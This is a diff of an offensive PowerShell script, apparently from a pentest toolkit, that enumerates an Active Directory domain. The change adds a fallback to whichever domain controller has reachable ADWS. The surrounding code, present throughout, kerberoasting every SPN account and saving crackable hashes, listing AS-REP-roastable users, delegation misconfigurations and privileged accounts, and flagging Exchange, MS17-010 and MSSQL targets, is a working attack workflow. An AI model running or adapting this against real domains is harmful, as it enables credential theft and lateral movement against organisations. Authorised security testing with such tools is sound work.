@@ -119,7 +119,7 @@ if (-Not (((Get-Module -Name "*PowerSploit*") -ne $null -or (Get-Module -Name "*
 # New-Alias -Name ConvertTo-Csv -Value "ConvertTo-Csv -NoTypeInformation -NoTypeInformation" -Scope
 
 #
-# Init variables
+# Init / Setting variables
 #
 
 $CurDir = (Get-Location).Path
@@ -129,6 +129,8 @@ $EnumMSSQLDir = "$CurDir\results\$Domain\mssql"
 $QuickWinsDir = "$EnumDir\quickwins"
 $KerberoastDir = "$EnumDir\kerberoast"
 $OutputDirs = @($EnumDir,$EnumMSSQLDir,$QuickWinsDir,$KerberoastDir)
+
+$Global:ProgressPreference = 'SilentlyContinue'
 
 #
 # Creating output dirs
@@ -163,9 +165,35 @@ foreach($DCip in $AllDCs.IP4Address){
     ls \\$DCip\pipe\spoolss
 }
 
-$RootDSE = Get-ADRootDSE -Server $PDC.IP4Address
+# Testing if ADWS is up on PDC and port 389 is accessible
+
+$TargetDC = $PDC.IP4Address
+
+$adws = Test-NetConnection -ComputerName $TargetDC -Port 9389
+if (! $adws.TcpTestSucceeded){
+    Write-Host -ForegroundColor red "[!] ADWS on PDC $($TargetDC) are not accessible"
+
+    Write-Output "[+] Trying to find a DC with accessible ADWS..."
+    foreach($DCip in $AllDCs.IP4Address){
+        if ($DCip -ne $TargetDC){
+            $adws = Test-NetConnection -ComputerName $DCip -Port 9389
+            if ($adws.TcpTestSucceeded){
+                Write-Output "[+] Target DC set to $($DCip)"
+                $TargetDC = $DCip
+                break
+            }
+        }
+    }
+
+    if ($TargetDC -eq $PDC.IP4Address){
+        Write-Host -ForegroundColor yellow "[+] Enumeration using Active Directory module may be limited"
+    }
+}
+
+$RootDSE = Get-ADRootDSE -Server $TargetDC
 
 # Test if RootDSE is null to construct the namingContext
+
 if ($RootDSE -eq $null){
     Write-Output "[!] Root DSE can not be retrieved !"
 }
@@ -177,17 +205,17 @@ foreach($DCip in $AllDCs.IP4Address){
 }
 
 Write-Banner -Text "Get-DomainSID"
-$DomainSID = Get-DomainSID -Domain $Domain -Server $PDC.IP4Address
+$DomainSID = Get-DomainSID -Domain $Domain -Server $TargetDC
 Write-Output $DomainSID
 
 Write-Banner -Text "Get-Domain"
 Get-Domain -Domain $Domain
 
 Write-Banner -Text "Get-ADForest"
-$Forest = Get-ADForest -Identity $Domain -Server $PDC.IP4Address
+$Forest = Get-ADForest -Identity $Domain -Server $TargetDC
 Write-Output $Forest
 
-$DomainPolicy = Get-DomainPolicy -Domain $Domain -Server $PDC.IP4Address
+$DomainPolicy = Get-DomainPolicy -Domain $Domain -Server $TargetDC
 
 Write-Banner -Text "(Get-DomainPolicy).SystemAccess"
 $DomainPolicy."SystemAccess"
@@ -196,22 +224,22 @@ Write-Banner -Text "(Get-DomainPolicy).KerberosPolicy"
 $DomainPolicy."KerberosPolicy"
 
 Write-Banner -Text "Get-DomainTrust"
-Get-DomainTrust -Domain $Domain -Server $PDC.IP4Address
+Get-DomainTrust -Domain $Domain -Server $TargetDC
 
 Write-Banner -Text "Get-ForestTrust"
 Get-ForestTrust -Forest $Forest.Name
 
 Write-Banner -Text "Get-DomainUser"
 Write-Output "[saving into ""$EnumDir\users.*""]"
-Get-DomainUser -Domain $Domain -Server $PDC.IP4Address | Output-Results -Path "$EnumDir\users"
+Get-DomainUser -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\users"
 
 Write-Banner -Text "Get-DomainGroup"
 Write-Output "[saving into ""$EnumDir\groups.*""]"
-Get-DomainGroup -Domain $Domain -Server $PDC.IP4Address | Output-Results -Path "$EnumDir\groups"
+Get-DomainGroup -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\groups"
 
 Write-Banner -Text "Get-DomainComputer"
 Write-Output "[saving into ""$EnumDir\computers.*""]"
-Get-DomainComputer -Domain $Domain -Server $PDC.IP4Address | Output-Results -Path "$EnumDir\computers"
+Get-DomainComputer -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\computers"
 
 #
 # Privileged accounts
@@ -235,7 +263,7 @@ $SchemaAdminsGroup = Get-DomainGroup -Domain $Domain -Identity "$DomainSID-518"
 $AccountOperatorsGroup = Get-DomainGroup -Domain $Domain -Identity "S-1-5-32-548"
 $BackupOperatorsGroup = Get-DomainGroup -Domain $Domain -Identity "S-1-5-32-551"
 
-$AdministratorsGroup.objectsid,$DomainAdminsGroup.objectsid,$EnterpriseAdminsGroup.objectsid,$SchemaAdminsGroup.objectsid,$AccountOperatorsGroup.objectsid,$BackupOperatorsGroup.objectsid | Get-DomainGroupMember -Recurse -Domain $Domain -Server $PDC.IP4Address 2> $null | Where-Object {($_.MemberObjectClass -eq "user") -and ([int]$_.MemberSID.split("-")[7] -ge 1000)} | Sort MemberSID -Unique | Output-Results -Path "$EnumDir\privileged_accounts" -Tee
+$AdministratorsGroup.objectsid,$DomainAdminsGroup.objectsid,$EnterpriseAdminsGroup.objectsid,$SchemaAdminsGroup.objectsid,$AccountOperatorsGroup.objectsid,$BackupOperatorsGroup.objectsid | Get-DomainGroupMember -Recurse -Domain $Domain -Server $TargetDC 2> $null | Where-Object {($_.MemberObjectClass -eq "user") -and ([int]$_.MemberSID.split("-")[7] -ge 1000)} | Sort MemberSID -Unique | Output-Results -Path "$EnumDir\privileged_accounts" -Tee
 
 <#
 foreach($pa in $PrivilegedAccounts){
@@ -280,8 +308,10 @@ foreach($pa in $PrivilegedAccounts){
 #
 
 Write-Banner -Text "Looking for Exchange servers"
+
 # Only keeping for now CN=ms-Exch-Exchange-Server
-$ExchangeServers = Get-ADExchangeServer -ConfigurationNamingContext $RootDSE.configurationNamingContext -Server $PDC.IP4Address | Where-Object {$_.Category -like "CN=ms-Exch-Exchange-Server*"} | Select-Object Version,FQDN,Roles,Class
+
+$ExchangeServers = Get-ADExchangeServer -ConfigurationNamingContext $RootDSE.configurationNamingContext -Server $TargetDC | Where-Object {$_.Category -like "CN=ms-Exch-Exchange-Server*"} | Select-Object Version,FQDN,Roles,Class
 $ExchangeServers | Output-Results -Path "$EnumDir\exchange_servers"
 
 # Looking for [PrivExchange, CVE-2020-0688]
@@ -358,7 +388,7 @@ foreach($ExchangeServer in $ExchangeServers){
 
 Write-Banner -Text "Looking for users having a mailbox"
 Write-Output "[saving into ""$EnumDir\users_with_mailbox.*""]"
-Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -LDAPFilter "(msExchMailboxGuid=*)" | Output-Results -Path "$EnumDir\users_with_mailbox"
+Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -LDAPFilter "(msExchMailboxGuid=*)" | Output-Results -Path "$EnumDir\users_with_mailbox"
 
 
 # ----------------------------------------------------------------
@@ -374,30 +404,30 @@ Write-BigBanner -Text "Looking for interesting stuff"
 #
 
 Write-Banner -Text "End-of-support Operating Systems (MS17-010)"
-Get-DomainComputer -Domain $Domain -Server $PDC.IP4Address |  Where-Object {($_.OperatingSystem -like "*XP*") -or ($_.OperatingSystem -like "*Vista*") -or ($_.OperatingSystem -like "*2003*") -or ($_.OperatingSystem -like "*Windows 7*") -or ($_.OperatingSystem -like "*Windows 8*")} | Output-Results -Path "$QuickWinsDir\deprecated_os" -Tee
+Get-DomainComputer -Domain $Domain -Server $TargetDC |  Where-Object {($_.OperatingSystem -like "*XP*") -or ($_.OperatingSystem -like "*Vista*") -or ($_.OperatingSystem -like "*2003*") -or ($_.OperatingSystem -like "*Windows 7*") -or ($_.OperatingSystem -like "*Windows 8*")} | Output-Results -Path "$QuickWinsDir\deprecated_os" -Tee
 
 #
 # AS_REP Roasting - no kerberos preauth
 #
 
 Write-Banner -Text "Users without kerberos preauth"
-Get-DomainUser -PreauthNotRequired -Domain $Domain -Server $PDC.IP4Address | Output-Results -Path "$QuickWinsDir\users_without_krb_preauth" -Tee
+Get-DomainUser -PreauthNotRequired -Domain $Domain -Server $TargetDC | Output-Results -Path "$QuickWinsDir\users_without_krb_preauth" -Tee
 
 #
 # Kerberoast
 #
 
 Write-Banner -Text "All kerberoastable users"
-$KerberoastableUsers = Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | Where-Object {$_.samaccountname -ne 'krbtgt'} 
+$KerberoastableUsers = Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | Where-Object {$_.samaccountname -ne 'krbtgt'} 
 $KerberoastableUsers | Output-Results -Path "$QuickWinsDir\kerberoastable_all" -Tee
 
 Write-Banner -Text "Kerberoastable users members of DA"
-Get-DomainUser -SPN -Domain $Domain -Server $PDC.IP4Address | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | Output-Results -Path "$QuickWinsDir\kerberoastable_da" -Tee
+Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | Output-Results -Path "$QuickWinsDir\kerberoastable_da" -Tee
 
 Write-Banner -Text "Kerberoasting all users"
 
 foreach($KerberoastableUser in $KerberoastableUsers){
-    Invoke-Kerberoast -Domain $Domain -Server $PDC.IP4Address -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
+    Invoke-Kerberoast -Domain $Domain -Server $TargetDC -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
 }
 Write-Output "[saving tickets into ""$KerberoastDir\""]"
 Write-Host -ForegroundColor yellow "`r`n[!] Now run:"
@@ -411,50 +441,50 @@ Write-Host -ForegroundColor yellow "    find /path/with/tickets -type f -name ""
 #
 
 Write-Banner -Text "Computers with unconstrained delegation - skip DCs"
-Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_computers" -Tee
+Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_computers" -Tee
 
 Write-Banner -Text "Users with unconstrained delegation"
-Get-ADUSer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_users" -Tee
+Get-ADUSer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_users" -Tee
 
 Write-Banner -Text "Managed Service Accounts with unconstrained delegation"
-Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_msa" -Tee
+Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_msa" -Tee
 
 #
 # Kerberos delegation - constrained
 #
 
 Write-Banner -Text "Computers with constrained delegation"
-Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_computers" -Tee
+Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_computers" -Tee
 
 Write-Banner -Text "Users with constrained delegation"
-Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_users" -Tee
+Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_users" -Tee
 
 Write-Banner -Text "Managed Service Accounts with constrained delegation"
-Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_msa" -Tee
+Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_msa" -Tee
 
 #
 # Kerberos delegation - constrained with protocol transition
 #
 
 Write-Banner -Text "Computers with constrained delegation and protocol transition"
-Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_computers" -Tee
+Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_computers" -Tee
 
 Write-Banner -Text "Users with constrained delegation and protocol transition"
-Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_users" -Tee
+Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_users" -Tee
 
 Write-Banner -Text "Managed Service Accounts with constrained delegation and protocol transition"
-Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_msa" -Tee
+Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_msa" -Tee
 
 #
 # Find services with msDS-AllowedToActOnBehalfOfOtherIdentity
 #
 
 Write-Banner -Text "Finding services with msDS-AllowedToActOnBehalfOfOtherIdentity"
-Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_computers" -Tee
+Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_computers" -Tee
 
-Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_users" -Tee
+Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_users" -Tee
 
-Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $PDC.IP4Address -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_msa" -Tee
+Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_msa" -Tee
 
 #
 # Find principals (RID >= 1000) with Replicating Directory Changes / Replicating Directory Changes All
@@ -499,7 +529,7 @@ Write-BigBanner -Text "Starting enumeration of MSSQL instances"
 #
 
 Write-Banner -Text "Enumerate MSSQL instances (looking for SPN service class MSSQL)"
-$AllSQLInstances = Get-SQLInstanceDomain -IncludeIP -DomainController $PDC.IP4Address
+$AllSQLInstances = Get-SQLInstanceDomain -IncludeIP -DomainController $TargetDC
 $AllSQLInstances | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\instances.csv" | ConvertFrom-Csv
 
 Write-Banner -Text "Are MSSQL instances accessible ?"
